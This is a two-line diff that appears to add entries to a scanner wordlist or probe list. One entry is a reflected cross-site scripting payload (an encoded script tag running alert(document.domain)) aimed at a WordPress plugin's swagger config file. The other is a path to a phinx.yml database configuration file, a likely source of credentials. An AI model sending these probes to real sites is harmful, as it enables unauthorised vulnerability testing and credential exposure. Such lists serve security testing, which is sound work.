@@ -1,0 +1,2 @@
+/wp-content/plugins/api-bearer-auth/swagger/swagger-config.yaml.php?&server=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/pme/database/pme/phinx.yml
